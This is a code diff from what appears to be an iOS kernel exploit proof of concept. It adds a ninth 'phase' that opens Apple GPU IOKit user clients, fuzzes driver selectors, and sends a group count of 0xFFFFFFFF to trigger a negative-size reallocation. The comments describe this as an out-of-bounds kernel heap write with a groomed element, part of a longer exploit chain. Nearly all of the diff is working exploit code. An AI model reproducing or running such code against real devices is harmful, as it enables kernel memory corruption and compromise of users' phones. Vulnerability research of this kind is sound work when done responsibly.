@@ -894,6 +894,116 @@ p8_sel12:;
     evf("[P8] DONE — if panic: F-109 confirmed -> proceed to F-74");
 }
 
+/*
+ * trigger_phase9: Systematic sel=7 STRUCT probe + full selector sweep.
+ *
+ * Phase 7 called sel=7 with SCALARS -> 0xe00002c2 (dispatch char='2' requires STRUCT).
+ * Phase 9 retries sel=7 with struct input across all plausible (count_offset, struct_size)
+ * combinations. Then sweeps all selectors 0-37 with SGAR struct to map dispatch table.
+ * Final test: SGAR(count=0xFFFFFFFF) sets internal COUNT=-1; a second SGAR call on the
+ * same group forces IOGPUResidentMemorySet::repack(COUNT=-1) -> alloc_size=-16 ->
+ * IOMallocTypeVar(-16) -> backward OOB write into preceding kalloc_type_var element.
+ * With groom element [12..15]=0x0F: combined [8..15]=0x0000000FFFFFC330 = COMMPAGE_FLAG.
+ */
+static void trigger_phase9(io_connect_t conn) {
+    evf("[P9] START: sel=7 struct probe + selector sweep for F-109 path");
+
+    /* Create base group count=4 as SGRR decrement target */
+    uint64_t g9 = try_sgar_q(conn, 4);
+    evf("[P9] G_FOUR: gid=0x%llx", g9);
+    if (!g9) { evf("[P9] ABORT: cannot create G_FOUR"); return; }
+
+    /* ── sel=7 struct probe: vary (count_field_offset, struct_size) ── */
+    /* Dispatch char '2' at position 7 requires struct — scalars return 0xe00002c2. */
+    static const uint32_t ck_offs[] = { 0x00, 0x08, 0x10, 0x18, 0x20, 0x24, 0x28 };
+    static const size_t   ck_szs[]  = { 0x10, 0x20, 0x40, 0x80, 0x100, 0x408, 0x410 };
+    static uint8_t p9_buf[SGAR_STRUCT_SIZE];
+
+    for (int oi = 0; oi < 7; oi++) {
+        for (int si = 0; si < 7; si++) {
+            size_t ssz = ck_szs[si];
+            if (ck_offs[oi] + 4 > ssz) continue;
+            memset(p9_buf, 0, ssz);
+            *(uint64_t *)(p9_buf + 0x00) = g9;
+            *(uint32_t *)(p9_buf + ck_offs[oi]) = 5;
+            uint8_t outp[0x20]; size_t osz = sizeof(outp); uint32_t ocnt = 0;
+            kern_return_t kr = IOConnectCallMethod(conn, 7,
+                NULL, 0, p9_buf, ssz, NULL, &ocnt, outp, &osz);
+            if (kr == 0) {
+                evf("[P9] SEL7 HIT: gid@0x00 count@0x%x ssz=0x%zx kr=0",
+                    ck_offs[oi], ssz);
+            } else if (kr != 0xe00002c2 && kr != 0xe00002be) {
+                evf("[P9] SEL7 NOTABLE: cnt_off=0x%x sz=0x%zx kr=0x%x",
+                    ck_offs[oi], ssz, kr);
+            }
+        }
+    }
+    evf("[P9] sel=7 struct sweep done");
+
+    /* ── Full selector sweep 0-37 with SGAR-format struct ── */
+    evf("[P9] SWEEP: sels 0-37 struct (log non-BadArg only)");
+    static uint8_t sw_buf[SGAR_STRUCT_SIZE];
+    for (int sel = 0; sel <= 37; sel++) {
+        if (sel == SGAR_SELECTOR) continue;
+        memset(sw_buf, 0, sizeof(sw_buf));
+        *(uint32_t *)(sw_buf + 0x00) = (uint32_t)g9;
+        *(uint32_t *)(sw_buf + 0x04) = (uint32_t)(g9 >> 32);
+        *(uint32_t *)(sw_buf + SGAR_COUNT_OFFSET) = 1;
+        uint8_t sw_out[0x20]; size_t sw_osz = sizeof(sw_out); uint32_t sw_ocnt = 0;
+        kern_return_t sw_kr = IOConnectCallMethod(conn, sel,
+            NULL, 0, sw_buf, sizeof(sw_buf), NULL, &sw_ocnt, sw_out, &sw_osz);
+        if (sw_kr == 0) {
+            evf("[P9] SWEEP sel=%d STRUCT kr=0 SUCCESS gid=0x%llx", sel, g9);
+        } else if (sw_kr != 0xe00002c2 && sw_kr != 0xe00002be) {
+            evf("[P9] SWEEP sel=%d NOTABLE kr=0x%x", sel, sw_kr);
+        }
+    }
+    evf("[P9] SWEEP done");
+
+    /* ── F-109 core: SGAR(count=0xFFFFFFFF) -> neg-count group -> repack ── */
+    /* SGAR with count=0xFFFFFFFF sets IOGPUResidentMemorySet COUNT field to -1.
+     * A second SGAR on the same group (gid in struct[0]) triggers repack(COUNT=-1):
+     *   alloc_size = (-1)*24 + 8 = -16 (int32) -> IOMallocTypeVar(-16) -> OOB write. */
+    evf("[P9] F109: SGAR(0xFFFFFFFF) -> G_NEG -> repack trigger");
+    uint64_t g9_neg = try_sgar_q(conn, 0xFFFFFFFF);
+    evf("[P9] G_NEG: gid=0x%llx (COUNT=-1)", g9_neg);
+
+    if (g9_neg) {
+        /* Repack trigger: SGAR on G_NEG with gid in struct[0], count=1, COMMPAGE at [0x28] */
+        memset(p9_buf, 0, sizeof(p9_buf));
+        *(uint32_t *)(p9_buf + 0x00) = (uint32_t)g9_neg;
+        *(uint32_t *)(p9_buf + 0x04) = (uint32_t)(g9_neg >> 32);
+        *(uint32_t *)(p9_buf + SGAR_COUNT_OFFSET) = 1;
+        *(uint32_t *)(p9_buf + 0x28) = (uint32_t)(COMMPAGE_FLAG & 0xFFFFFFFF);
+        *(uint32_t *)(p9_buf + 0x2C) = (uint32_t)(COMMPAGE_FLAG >> 32);
+        uint8_t rp_out[0x10]; size_t rp_osz = sizeof(rp_out); uint32_t rp_ocnt = 0;
+        kern_return_t rp_kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+            NULL, 0, p9_buf, sizeof(p9_buf), NULL, &rp_ocnt, rp_out, &rp_osz);
+        evf("[P9] REPACK: SGAR(g_neg,count=1) kr=0x%x COMMPAGE=0x%016llx",
+            rp_kr, COMMPAGE_FLAG);
+
+        /* Also sweep sels 5-15 on g_neg: any non-BadArg could be the decrement path */
+        for (int rsel = 5; rsel <= 15; rsel++) {
+            if (rsel == SGAR_SELECTOR) continue;
+            memset(sw_buf, 0, sizeof(sw_buf));
+            *(uint32_t *)(sw_buf + 0x00) = (uint32_t)g9_neg;
+            *(uint32_t *)(sw_buf + 0x04) = (uint32_t)(g9_neg >> 32);
+            *(uint32_t *)(sw_buf + SGAR_COUNT_OFFSET) = 1;
+            uint8_t rs_out[0x20]; size_t rs_osz = sizeof(rs_out); uint32_t rs_ocnt = 0;
+            kern_return_t rs_kr = IOConnectCallMethod(conn, rsel,
+                NULL, 0, sw_buf, sizeof(sw_buf), NULL, &rs_ocnt, rs_out, &rs_osz);
+            if (rs_kr == 0) {
+                evf("[P9] NEG-SWEEP sel=%d STRUCT kr=0 -> REPACK TRIGGERED", rsel);
+            } else if (rs_kr != 0xe00002c2 && rs_kr != 0xe00002be) {
+                evf("[P9] NEG-SWEEP sel=%d kr=0x%x (non-BadArg)", rsel, rs_kr);
+            }
+        }
+    }
+
+    evf("[P9] DONE — panic with GPR=0x%016llx -> F-109 CONFIRMED -> F-74 chain",
+        COMMPAGE_FLAG);
+}
+
 static void trigger_bof_iokit(void) {
     evf("[BOF] IOKIT_START sel=%d struct=0x%x count_off=0x%x",
         SGAR_SELECTOR, SGAR_STRUCT_SIZE, SGAR_COUNT_OFFSET);
@@ -1168,6 +1278,34 @@ void run_cve28882_poc(UIWindow *window) {
                                             trigger_phase8(conn8);
                                             IOServiceClose(conn8);
                                             evf("[P8] CONN8 closed");
+
+                                            /* Phase 9: sel=7 struct probe + systematic sweep */
+                                            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3*NSEC_PER_SEC),
+                                                           dispatch_get_main_queue(), ^{
+                                                mach_port_t mp9 = 0;
+                                                IOMasterPort(MACH_PORT_NULL, &mp9);
+                                                io_connect_t conn9 = 0;
+                                                const char *svc9[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
+                                                for (int si9 = 0; svc9[si9] && !conn9; si9++) {
+                                                    CFMutableDictionaryRef m9 = IOServiceMatching(svc9[si9]);
+                                                    io_iterator_t it9 = 0;
+                                                    IOServiceGetMatchingServices(mp9, m9, &it9);
+                                                    io_service_t sv9 = IOIteratorNext(it9);
+                                                    IOObjectRelease(it9);
+                                                    if (!sv9) continue;
+                                                    kern_return_t kr9 = IOServiceOpen(sv9, mach_task_self(), 1, &conn9);
+                                                    IOObjectRelease(sv9);
+                                                    if (kr9 != 0) conn9 = 0;
+                                                }
+                                                if (conn9) {
+                                                    evf("[P9] CONN9 ready=0x%x", conn9);
+                                                    trigger_phase9(conn9);
+                                                    IOServiceClose(conn9);
+                                                    evf("[P9] CONN9 closed");
+                                                } else {
+                                                    evf("[P9] CONN9 failed");
+                                                }
+                                            });
                                         } else {
                                             evf("[P8] CONN8 failed");
                                         }
